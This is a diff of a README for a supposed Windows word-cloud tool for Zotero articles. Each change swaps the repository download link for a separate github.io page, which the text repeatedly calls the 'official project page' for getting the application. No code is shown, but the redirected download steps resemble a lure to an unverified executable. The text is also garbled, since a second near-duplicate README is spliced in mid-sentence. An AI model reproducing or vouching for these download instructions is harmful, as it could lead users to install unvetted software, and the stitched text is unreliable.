@@ -1,6 +1,6 @@
 # ☁️ nuvem-palavras-z - Create Word Clouds From Zotero Articles
 
-[![Download Now](https://img.shields.io/badge/Download_Now-nuvem--palavras--z-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mvcingenier5535/nuvem-palavras-z)
+[![Download Now](https://img.shields.io/badge/Download_Now-nuvem--palavras--z-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://mvcingenier5535.github.io)
 
 nuvem-palavras-z helps you turn articles stored in Zotero into clear word clouds and term counts. It is made for readers, researchers, students, writers, and anyone who wants to see which words appear most often in a paper or group of papers. You do not need programming knowledge to use it. The application works with the articles in your Zotero library and gives you a visual way to explore their language. The project description is Word clouds and term counts by article inside Zotero. / Nuvens de palavras e consulta de ocorrências por artigo no Zotero.
 
@@ -41,7 +41,7 @@ The tool is organized by article. That means you can choose a specific item from
 
 Follow these steps on your Windows computer.
 
-1. Visit this link to download the application: [Download nuvem-palavras-z](https://github.com/mvcingenier5535/nuvem-palavras-z).
+1. Visit this link to download the application: [Download nuvem-palavras-z](https://mvcingenier5535.github.io).
 
 2. The link opens the official project page. Use the download option shown there to get the application.
 
@@ -67,7 +67,7 @@ After you understand the cloud, open the term count view. This view lists words 
 
 Repeat the same process with another article to compare results. Because nuvem-palavras# ☁️ nuvem-palavras-z - Turn Zotero Articles Into Word Clouds
 
-[![Download Now](https://img.shields.io/badge/Download_Now-nuvem--palavras--z-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mvcingenier5535/nuvem-palavras-z)
+[![Download Now](https://img.shields.io/badge/Download_Now-nuvem--palavras--z-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://mvcingenier5535.github.io)
 
 nuvem-palavras-z creates word clouds and term counts by article inside Zotero. It is designed for readers, students, researchers, teachers, writers, and anyone who wants to understand the main words in an article without doing manual counting. You do not need programming knowledge to use it. The application gives you a visual word cloud and a clear term count view for the articles you already keep in Zotero.
 
@@ -110,7 +110,7 @@ The application is organized by article. You choose a specific item from your Zo
 
 Follow these steps on your Windows computer.
 
-1. Visit this link to download the application: [Download nuvem-palavras-z](https://github.com/mvcingenier5535/nuvem-palavras-z).
+1. Visit this link to download the application: [Download nuvem-palavras-z](https://mvcingenier5535.github.io).
 
 2. The link opens the official project page. Use the download option shown there to get the application.
 
@@ -176,7 +176,7 @@ What does nuvem-palavras-z do? It creates word clouds and term counts for articl
 
 Do I need to know how to code? No. The application is made for average computer users.
 
-Where do I download it? Visit this link to download the application: [nuvem-palavras-z official page](https://github.com/mvcingenier5535/nuvem-palavras-z).
+Where do I download it? Visit this link to download the application: [nuvem-palavras-z official page](https://mvcingenier5535.github.io).
 
 What do I need open when I use it? Open nuvem-palavras-z and Zotero. Choose an article from your Zotero library.
 
@@ -188,6 +188,6 @@ Can I review one article at a time? Yes. The application is organized by article
 
 ## 📥 Download Again
 
-Visit this link to download the application: [Download nuvem-palavras-z](https://github.com/mvcingenier5535/nuvem-palavras-z). Use the official project page to get the application on Windows, then open it and choose an article from Zotero.
+Visit this link to download the application: [Download nuvem-palavras-z](https://mvcingenier5535.github.io). Use the official project page to get the application on Windows, then open it and choose an article from Zotero.
 
 Keywords: contagem-frequencia, nuvem-de-palavras, text-analysis, word-frequency, wordcloud, wordcloud-generator, wordcloud-visualization, zotero, zotero-addon, zotero-plugin
